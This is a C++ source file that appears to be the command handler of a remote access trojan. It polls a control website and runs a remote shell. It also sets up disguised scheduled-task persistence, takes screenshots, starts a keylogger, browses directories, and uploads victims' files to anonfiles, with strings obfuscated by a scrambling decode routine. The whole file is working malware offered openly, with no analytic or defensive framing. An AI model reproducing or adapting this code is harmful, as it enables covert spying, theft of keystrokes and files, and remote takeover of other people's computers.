#include "CURL.h"

void Curl::Control()
{
	std::string command = "";
	std::string last_command = "";
	std::string option = "";
	std::string temp = "";
	while (true)
	{
		this->Send_Recv(command); // Read the command from the bot page

		if (command != last_command && command != "" && command != "\n") // Prevents from execute more than one & Simple check
		{
			last_command = command;
			option = this->getWord(command, 1); // Get the option from the full command
			command = command.substr(command.find_first_of(" \t") + 1); // Delete the option from the command

			if (option == "JzbMqrTe6d") // Remote Shell
			{
				temp = Tools::CMD(command, TRUE);
				if (temp == "")
					temp = Tools::decode("he+tSo.+y.ptEms++IltsuRed!unfot+noy+mad+anmmco+"); // decode -> Result+Is+Empty..+So+the+command+may+not+found!
				this->Send_Recv(temp, "", Tools::decode("e_otem&rl=elsh") + temp); // decode -> &remote_shell=
			}
			else if (option == "XGriQXsB3X") // Task Scheduler Save - Create a task in Task Scheduler in Microsoft//Windows//Security
			{
				std::string task_name = this->getWord(command, 1);
				std::string binary_path = this->getWord(command, 2);

				if (task_name != "" && binary_path != "")
				{
					if (!TaskScheduler::isTaskExists(task_name) && Tools::FileExists(binary_path))
					{
						if (TaskScheduler::createTask(binary_path, task_name))
							this->Send_Recv(temp, "", Tools::decode("re=Ceruledch_sskta!&ssceuc+SskTae+at")); // decode -> &task_scheduler=Create+Task+Success!
						else
							this->Send_Recv(temp, "", Tools::decode("Crr=leduhesck_as&td!leai+FskTae+ate")); // decode -> &task_scheduler=Create+Task+Failed!
					}
					else
						this->Send_Recv(temp, "", Tools::decode("Crr=leduhesck_as&td!leai+FskTae+ate")); // decode -> &task_scheduler=Create+Task+Failed!
				}
			}
			else if (option == "jJYRPoebc5") // Task Scheduler Delete - Delete a task from task scheduler in Microsoft//Windows//Security
			{
				std::string task_name = this->getWord(command, 1);
				if (task_name != "" && task_name != option)
				{
					if (TaskScheduler::deleteTask(task_name))
						this->Send_Recv(temp, "", Tools::decode("el=Deruledch_sskta!&ssceuc+SskTae+et")); // decode -> &task_scheduler=Delete+Task+Success!
					else
						this->Send_Recv(temp, "", Tools::decode("Der=leduhesck_as&td!leai+FskTae+etl")); // decode -> &task_scheduler=Delete+Task+Failed!
				}
			}
			else if (option == "7dzX75qVf1") // Screenshot - Take a screenshot & Upload to anonfiles & send the url for the control website
			{
				char temp_path[MAX_PATH];
				std::string file_path = Tools::decode("fu34fosjng.p9c"); // just a random name for the file | decode -> sjfo34fu9c.png

				if (GetTempPathA(sizeof(temp_path), temp_path))
				{
					file_path = temp_path + file_path;
					if (Tools::TakeScreenshot(file_path))
					{
						std::string url = this->anonFilesUpload(file_path);
						if (url != "")
							this->Send_Recv(temp, "", Tools::decode("enresc=&otsh") + url); // decode -> &screenshot=
					}
					DeleteFileA(file_path.c_str());
				}
			}
			else if (option == "0OMnslw789") // Start Keyloggere - Start a thread with a keylogger
			{
				this->StartKeyloggerThread();
			}
			else if (option == "ajV73H3mMa") //Stop Keylogger - Stop the keylogger thread
			{
				this->Keylogger_status = FALSE;
			}
			else if (option == "UD7WEHe1eO") // File Explorer - Send a dir list ("dir /b")
			{
				std::string path = command;
				if (path != "" && path != option)
				{
					if (Tools::dirExists(path))
					{
						if (CMD(path, FALSE, FALSE, TRUE) == "success") // Change Directory
						{
							temp = CMD(Tools::decode("r di/b"), TRUE, FALSE, FALSE, TRUE); // List a directory | decode -> dir /b
							if (temp != "")
								this->Send_Recv(temp, "", Tools::decode("exe_il&fr=relop") + temp); // decode -> &file_explorer=
						}
					}
				}
				else // File Explorer - Only send a list of the current directory
				{
					temp = CMD(Tools::decode("r di/b"), FALSE, FALSE, FALSE, TRUE); // decode -> dir /b
					if (temp != "")
						this->Send_Recv(temp, "", Tools::decode("exe_il&fr=relop") + temp); // decode -> &file_explorer=
				}
			}
			else if (option == "kw4mIFQSav") // (Part of the file explorer) Upload file to anonfiles
			{
				std::string file_path = command;
				if (file_path != "" && file_path != option)
				{
					if (FileExists(file_path))
					{
						std::string url = this->anonFilesUpload(file_path);
						if (url != "")
							this->Send_Recv(temp, "", Tools::decode("oanlow&de=il_fd") + url); // decode -> &download_file=
					}
				}
			}
			else if (option == "2UuVIJjMcd") // (Part of the file explorer) Download file from the control website
			{
				std::string file_name = command;
				if (file_name != "" && file_name != option)
				{
					if(this->DownloadFile(file_name))
						this->Send_Recv(temp, "", Tools::decode("loUpe=il_fadloups&esccSue+il+Fad")); // decode -> &upload_file=Upload+File+Success
					else
						this->Send_Recv(temp, "", Tools::decode("pl=Ulefid_oapl&uedilFae+il+Fado")); // decode -> &upload_file=Upload+File+Failed
				}
			}
			else if (option == "hgd4gi0lcP") // File Explorer - Go to up folder
			{
				if (SetCurrentDirectoryA(".."))
				{
					temp = CMD(Tools::decode("r di/b"), TRUE, FALSE, FALSE, TRUE); // List a directory | decode -> dir /b
					if (temp != "")
						this->Send_Recv(temp, "", Tools::decode("exe_il&fr=relop") + temp); // decode -> &file_explorer=
				}
			}
		}

		Sleep(10000);
	}
}